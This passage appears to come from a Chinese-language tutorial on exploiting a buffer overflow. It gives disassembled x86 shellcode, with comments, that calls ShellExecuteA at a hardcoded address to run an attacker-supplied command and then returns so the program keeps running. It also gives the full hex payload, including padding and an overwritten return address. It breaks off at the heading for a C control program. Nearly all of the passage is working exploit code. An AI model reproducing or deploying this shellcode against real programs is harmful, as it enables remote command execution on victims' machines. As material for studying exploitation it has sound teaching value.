
```
0012FBF4    99             cdq                                   ; edx 清 0
0012FBF5    8B4C24 FC      mov     ecx, dword ptr [esp-4]        ; shellcode 首地址
0012FBF9    50             push    eax                           ; 堆栈平衡
0012FBFA    66:BA 1240     mov     dx, 4012
0012FBFE    C1E2 08        shl     edx, 8
0012FC01    B2 55          mov     dl, 55                        ; 401255:程序返回地址
0012FC03    52             push    edx                           ; 保存返回地址
0012FC04    66:BA FCBF     mov     dx, 0BFFC                     ; 40BFFC,ShellExecuteA 函数的地址
0012FC08    60             pushad                                ; 保存现场
0012FC09    33DB           xor     ebx, ebx                      ; 清 0
0012FC0B    8D41 47        lea     eax, dword ptr [ecx+47]       ; 用户输入命令的结束位置
0012FC0E    8818           mov     byte ptr [eax], bl            ; 写入 0,使字符串结束
0012FC10    8D41 43        lea     eax, dword ptr [ecx+43]       ; 参数首地址前一位
0012FC13    8818           mov     byte ptr [eax], bl            ; 写入 0,使字符串结束
0012FC15    8D41 3F        lea     eax, dword ptr [ecx+3F]       ; "open"字符结束的位置
0012FC18    8818           mov     byte ptr [eax], bl            ; 写入 0,使字符串结束
0012FC1A    8D41 40        lea     eax, dword ptr [ecx+40]       ; 用户输入命令的首地址
0012FC1D    8D71 44        lea     esi, dword ptr [ecx+44]       ; 参数首地址
0012FC20    8D79 3B        lea     edi, dword ptr [ecx+3B]       ; "open"字符首地址
0012FC23    43             inc     ebx
0012FC24    53             push    ebx                           ; NShowCmd=1
0012FC25    4B             dec     ebx
0012FC26    53             push    ebx                           ; LpDirectory=0
0012FC27    56             push    esi                           ; LpParameters=用户命令参数
0012FC28    50             push    eax                           ; LpFile=用户命令
0012FC29    57             push    edi                           ; LpOperation="open"
0012FC2A    53             push    ebx                           ; hWnd=0
0012FC2B    FF12           call    dword ptr [edx]               ; Call ShellExecuteA
0012FC2D    61             popad                                 ; 恢复现场
0012FC2E    C3             retn                                  ; 返回程序继续执行
```

二进制数据为：

```
99 8B 4C 24 FC 50 66 BA 12 40 C1 E2 08 B2 55 52 66 BA FC BF 60 33 DB 8D 41 47 88 18 8D 41 43 88
18 8D 41 3F 88 18 8D 41 40 8D 71 44 8D 79 3B 43 53 4B 53 56 50 57 53 FF 12 61 C3 6F 70 65 6E CC
63 6D 64 20 64 69 72 CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC
CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC
CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC
CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC
CC CC CC CC CC CC CC A4 10 40
```

### 第五步：编写控制程序。

C 代码如下：

（一直没用 C，其中网络连接的代码都是从网上 COPY 的，最后一小段代码可把我累坏了！）
